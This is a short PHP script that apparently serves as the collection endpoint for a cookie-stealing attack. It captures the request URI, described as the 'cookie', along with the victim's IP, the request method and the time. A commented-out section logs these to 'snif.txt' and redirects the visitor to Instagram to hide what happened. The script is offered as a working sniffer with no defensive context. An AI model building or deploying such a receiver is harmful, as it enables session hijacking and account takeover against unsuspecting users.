<style type="text/css">
	strong{
		font-size: 22px;
	}
</style>
<?php	
	// save base cooki file
		$cookie = $_SERVER["REQUEST_URI"];
		$metgod = $_SERVER["REQUEST_METHOD"];
		$name_server = $_SERVER["SERVER_NAME"];

		// save base ip adres
		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = @$_SERVER['REMOTE_ADDR'];
		 
		if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
		elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
		else $ip = $remote;
		 

		$time = date("H:i:M:d");

		print"<strong>Cookie: </strong>  $cookie<br><br>";
		print"<strong>Ip: </strong>  $ip<br><br>";
		print"<strong>Time: </strong> $time<br><br>";
		print"<strong>Metgod: </strong> $metgod<br><br>";
		print"<strong>Name_server: </strong> $name_server";

/*
		// create file
		$file = fopen("snif.txt", "a+");

		// Time
		$time = date("H:i:M:d");

		// add string cookie and time + ip
		$add_text = "$ip  $cookie";

		// read data to a file 
		fputs($file, $add_text. ",\r\n");

		// close file
		fclose($file);

		// open instagramm
		header('Location: https://www.instagram.com/?hl=ru');
		
*/
 
		


?>
